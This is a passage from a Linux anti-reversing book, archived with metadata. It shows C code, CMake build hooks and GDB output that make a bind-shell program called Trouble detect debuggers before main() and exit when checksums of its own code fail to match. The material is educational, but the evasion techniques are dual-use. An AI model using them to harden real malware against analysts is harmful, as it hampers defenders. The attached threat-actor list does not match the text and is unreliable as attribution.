pts/11 S 0:00 **\\_ sudo ./trouble/trouble**\n8078 pts/11 S 0:00 | **\\_ ./trouble/trouble**\n8079 pts/11 S 0:00 | **\\_ ./trouble/trouble**\n8080 pts/11 R+ 0:00 **\\_ ps fa**\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo kill -11 80\\\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 232\n\n79\n\n[1]+ Killed sudo ./trouble/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l\ntotal 56\n-rw-rw-r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt\ndrwxrwxr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:51 CMakeFiles\n-rw-rw-r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise\n-rw-rw-r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary\ndrwxrwxr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:51 trouble\n\n### Detection Before main()\n\n##### You’ve come a long way in preventing the debugger from doing anything useful to aid in reverse engineering. However, GDB can still sometimes⁵⁵ run Trouble until the tracing child detects the debugger and kills the program. It would be better to catch the debugger and exit earlier. Luckily, there is a mechanism to add code that will execute before main() is executed. Functions using the “constructor” attribute will be called before main().\n\n###### Checking /proc/self/status before main()\n\n/**\n\n - Before we enter main check to see if a debugger is present\n*/\n**void __attribute__((constructor)) before_main()**\n{\ncheck_proc_status();\n}\n\n/**\n\n - This implements a fairly simple bind shell. The server first requires a\n\n###### ⁵⁵Sometimes GDB will crash in main() upon entry. That is because GDB inserts a break point at the first instruction in\n_main(), but the cryptor computes an XOR over that value. This can sometimes cause a crash and sometimes not (depends on_\nthe generated code).\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 233\n\n - password before allowing access to the shell. The password is currently\n\n - randomly generated each time 'cmake ..' is run. The server has no shutdown\n\n - mechanism so it will run until killed.\n*/\n**int main(int p_argc, char* p_argv[])**\n\n##### The above will cause Trouble to exit early.\n\n###### Exiting before hitting main()\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo gdb ./troub\\\nle/trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) run\nStarting program: /home/albino-lobster/antire_book/chap_6_debugger/dontpanic/build/tr\\\nouble/trouble\n\n[Inferior 1 (process 3098) exited with code 01]\n(gdb)\n\n### Computing Function Checksums\n\n##### At this point, you need to be concerned about the reverse engineer modifying Trouble in order to patch out the various debugger checks that have been added. There are two ways to combat this:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 234\n\n##### 1. Encrypt your functions like we did in chapter four. 2. Compute checksums over your code to ensure it hasn’t changed.\n\n While I think the encryption approach is the better choice because it has a few other benefits (anti static analysis and anti memory analysis) variety is the spice of life. For this implementation you’ll be using a modified version of the CRC32 algorithm written by Stephan Brumme⁵⁶. The CRC32 code is spread across two files:\n\n###### chap_6_debugger/dontpanic/computeChecksums/src/crc32.h\n\n#include <stdint.h>\n\n// based on http://create.stephan-brumme.com/crc32/#git1\n**uint32_t crc32_bitwise(const unsigned char* data, uint64_t length);**\n\n###### chap_6_debugger/dontpanic/computeChecksums/src/crc32.c\n\n#include \"crc32.h\"\n\n#include <stdlib.h>\n#include <sys/param.h>\n\n**uint32_t crc32_bitwise(const unsigned char* data, uint64_t length)**\n{\n\n**uint32_t crc = ~0;**\n**const unsigned char* current = data;**\n\n**while (length-- != 0)**\n{\ncrc ^= *current++;\n\n**for (int j = 0; j < 8; j++)**\n{\ncrc = (crc >> 1) ^ (-(int32_t)(crc & 1) & 0xEDB88320);\n}\n}\n\n**return ~crc;**\n}\n\n###### ⁵⁶http://create.stephan-brumme.com/crc32/\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 235\n\n##### As you’ve done previously, you’ll rely on special section names and the linker to find the code we want to compute the checksum over and insert the proper values post-compilation. I’ve introduced a new project called “computeChecksums” in the chapter 6 repository. The computeChecksums directory contains the crc files above and two other files:\n\n###### chap_6_debugger/dontpanic/computeChecksums/CMakeLists.txt\n\nproject(computeChecksums CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_CXX_FLAGS \"-Wall -Wextra -g\")\n\nadd_executable(${PROJECT_NAME}\n\nsrc/computeChecksums.cpp\nsrc/crc32.c)\n\nset_source_files_properties(src/crc32.c PROPERTIES LANGUAGE CXX)\n\n###### chap_6_debugger/dontpanic/computeChecksums/src/computeChecksums.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n#include <map>\n\n#include \"crc32.h\"\n\n**bool compute_crcs(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F')**\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Shdr* sections = reinterpret_cast<Elf64_Shdr*>(&p_data[ehdr->e_shoff]);\nElf64_Half sections_count = ehdr->e_shnum;\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 236\n\nElf64_Shdr* strings_header = reinterpret_cast<Elf64_Shdr*>(&p_data[ehdr->e_shoff]\n\n+ (ehdr->e_shentsize * ehdr->e_shstrndx));\n**const char* strings_table = &p_data[strings_header->sh_offset];**\n\nstd::map<std::string, Elf64_Addr> crc_mappings;\n\n// find all \".compute_crc_\" sections\nElf64_Shdr* current = sections;\n**for (int i = 0; i < sections_count; i++, current++)**\n{\nstd::string section_name(&strings_table[current->sh_name]);\n**if (section_name.find(\".compute_crc_\") == 0)**\n{\nstd::string func_name = \".\" + section_name.substr(13);\ncrc_mappings[func_name] = current->sh_offset;\n}\n}\n\n// find all sections that \".compute_crc_\" was referencing\ncurrent = sections;\n**for (int i = 0; i < sections_count; i++, current++)**\n{\nstd::string section_name(&strings_table[current->sh_name]);\n**if (crc_mappings.find(section_name) != crc_mappings.end())**\n{\n\n**uint32_t crc =crc32_bitwise(reinterpret_cast<unsigned char*>(**\n\n&p_data[current->sh_offset]), current->sh_size);\nmemcpy(&p_data[crc_mappings[section_name]], &crc, sizeof(crc));\n}\n}\n\n**return true;**\n}\n\n/*\n\n - Load ELF.\n\n - Scan sections for \"load_crc_xxx\"\n\n - Scan sections for \"xxx\"\n*/\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 237\n\nstd::cerr << \"Usage: ./computeChecksums <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to open the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)),\nstd::istreambuf_iterator<char>());\ninputFile.close();\n\ncompute_crcs(input);\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cout << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n\n**return EXIT_SUCCESS;**\n}\n\n##### In order to integrate computeChecksums into dontpanic, the CMakeLists.txt needs to be updated:\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 238\n\n chap_6_debugger/dontpanic/CMakeLists.txt\n\nproject(dontpanic C)\ncmake_minimum_required(VERSION 3.0)\n\nadd_subdirectory(stripBinary)\nadd_subdirectory(fakeHeadersXBit)\nadd_subdirectory(encryptFunctions)\nadd_subdirectory(computeChecksums)\nadd_subdirectory(madvise)\nadd_subdirectory(cryptor)\nadd_subdirectory(trouble)\n\n##### Also, the linker script needs to be updated.\n\n###### chap_6_debugger/dontpanic/trouble_layout.lds\n\nSECTIONS\n{\ncheck_password_size = SIZEOF(.check_password);\nmain_function_size = SIZEOF(.main_function);\n}\n\n##### Next we need to add definitions for .main_function and .compute_crc_main_func- tion in trouble.c.\n\n###### chap_6_debugger/dontpanic/trouble/src/trouble.c\n\n**uint32_t madvise_base __attribute((section(\".madvise_base_addr\"))) = 0;**\n**uint32_t madvise_size __attribute((section(\".madvise_size\"))) = 0;**\n\n**extern void* main_function_size;**\n**uint32_t main_function_crc __attribute((section(\".compute_crc_main_function\"))) = 0;**\n\n##### Let’s change before_main() to compare the stored crc32 of main() against the value computed at runtime.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 239\n\n Compute the checksum at runtime\n\n/**\n\n - Before we enter main check to see if a debugger is present\n*/\n**void __attribute__((constructor)) before_main()**\n{\n\n// check for bp in launch_thread\n**if(crc32_bitwise((unsigned char*)(&main), (uint64_t)&main_function_size) !=**\n\nmain_function_crc)\n{\nexit(0);\n}\n}\n\n##### Finally, hook computeChecksums into Trouble’s CMakeLists.txt\n\n###### chap_6_debugger/dontpanic/CMakeLists.txt\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\" -Dpassword_size=33)\n\nset(CMAKE_C_COMPILER musl-gcc)\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -static -std=gnu11 -Wno-int-to-pointer-cas\\\nt\")\nadd_executable(${PROJECT_NAME} src/trouble.c src/rc4.c src/crc32.c)\n\nadd_custom_target(addLDS\n\nCOMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds -o,g' ./CM\\\nakeFiles/trouble.dir/link.txt)\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 240\n\nadd_dependencies(${PROJECT_NAME} addLDS)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../madvise/madvise ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../computeChecksums/computeChecksums ${CMAKE_CURRENT_BINARY_DIR}/${PROJEC\\\nT_NAME})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJEC\\\nT_NAME})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../cryptor/cryptor ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})\n\n##### You should now be able to recompile Trouble.\n\n###### Compiling Trouble with computeChecksums hooked into the build process\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ make\n\n[ 11%] Built target stripBinary\n\n[ 22%] Built target fakeHeadersXBit\n\n[ 38%] Built target encryptFunctions\nScanning dependencies of target computeChecksums\n\n[ 44%] Building CXX object computeChecksums/CMakeFiles/computeChecksums.dir/src/compu\\\nteChecksums.cpp.o\n\n[ 50%] Linking CXX executable computeChecksums\n\n[ 55%] Built target computeChecksums\n\n[ 66%] Built target madvise\n\n[ 77%] Built target cryptor\n\n[ 77%] Built target addLDS\nScanning dependencies of target trouble\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 241\n\n[ 83%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o\n\n[ 88%] Building C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o\n\n[ 94%] Building C object trouble/CMakeFiles/trouble.dir/src/crc32.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: 5LMxre8Z052LlLk1nfOypemEZwJ56jK6\n\n[+] Encrypted 0x3b26\n\n[100%] Built target trouble\n\n##### Now when you execute Trouble using GDB the output should look like this.\n\n###### Trouble exits early with GDB attached\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo gdb ./troub\\\nle/trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) start\nTemporary breakpoint 1 at 0x403c5a\nStarting program: /home/albino-lobster/antire_book/chap_6_debugger/dontpanic/build/tr\\\nouble/trouble\n\n[Inferior 1 (process 39299) exited normally]\n(gdb)\n\n##### Trouble exits because GDB has modified main() by overwriting a byte with a breakpoint. When Trouble computes the checksum over main() it won’t match the stored checksum which causes Trouble to exit.\n\n\n-----\n\n# Conclusion: All That We Fall For\n\n##### This concludes the book. For your pleasure I’ve created a “final” version of the Trouble bind shell in its own GitHub repository. The goal of this version is to combine as many of the anti-reversing techniques that you learned into a single binary. Remember, Trouble is not immune to reversing. It is simply meant to be annoying to reverse. You can find the final version here:\n\n https://github.com/antire-book/dont_panic\n\n Thanks for following along. Happy reversing!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Evasion/Programming Linux Anti-Reversing Techniques.pdf"
    ],
    "report_names": [
        "Programming Linux Anti-Reversing Techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "3f918a1b-2f20-4f3f-ae16-31e83d9d91d9",
            "created_at": "2023-06-23T02:04:34.088425Z",
            "updated_at": "2025-03-27T02:02:09.769759Z",
            "deleted_at": null,
            "main_name": "Bad Magic",
            "aliases": [
                "Bad Magic",
                "CloudWizard",
                "RedStinger"
            ],
            "source_name": "ETDA:Bad Magic",
            "tools": [
                "CommonMagic",
                "PowerMagic"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ff5a7bd9-75a5-43fe-ba4c-27dab43e1f61",
            "created_at": "2023-11-07T02:00:07.086058Z",
            "updated_at": "2025-03-27T02:00:03.169516Z",
            "deleted_at": null,
            "main_name": "RedStinger",
            "aliases": [
                "Bad Magic"
            ],
            "source_name": "MISPGALAXY:RedStinger",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f74e4fe6-6281-45e7-8866-0ff4316381cc",
            "created_at": "2024-05-01T02:03:07.959101Z",
            "updated_at": "2025-03-27T02:05:17.270819Z",
            "deleted_at": null,
            "main_name": "BRONZE HOBART",
            "aliases": [
                "Pirate Panda ",
                "Tropic Trooper ",
                "KeyBoy "
            ],
            "source_name": "Secureworks:BRONZE HOBART",
            "tools": [
                " KeyBoy",
                " Pfine",
                "DSNGInstaller"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "61ea51ed-a419-4b05-9241-5ab0dbba25fc",
            "created_at": "2023-01-06T13:46:38.354607Z",
            "updated_at": "2025-03-27T02:00:02.81258Z",
            "deleted_at": null,
            "main_name": "APT23",
            "aliases": [
                "KeyBoy",
                "Tropic Trooper",
                "BRONZE HOBART",
                "G0081",
                "Red Orthrus",
                "Earth Centaur",
                "PIRATE PANDA"
            ],
            "source_name": "MISPGALAXY:APT23",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bef7800a-a08f-4e21-b65c-4279c851e572",
            "created_at": "2022-10-25T15:50:23.409336Z",
            "updated_at": "2025-03-27T02:00:55.463048Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "Tropic Trooper",
                "Pirate Panda",
                "KeyBoy"
            ],
            "source_name": "MITRE:Tropic Trooper",
            "tools": [
                "USBferry",
                "ShadowPad",
                "PoisonIvy",
                "BITSAdmin",
                "YAHOYAH",
                "KeyBoy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536162,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1482235208,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/3a84c6f6b671408c8e55c7a6129f17bcc256de10.pdf",
        "text": "https://archive.orkl.eu/3a84c6f6b671408c8e55c7a6129f17bcc256de10.txt",
        "img": "https://archive.orkl.eu/3a84c6f6b671408c8e55c7a6129f17bcc256de10.jpg"
    }
}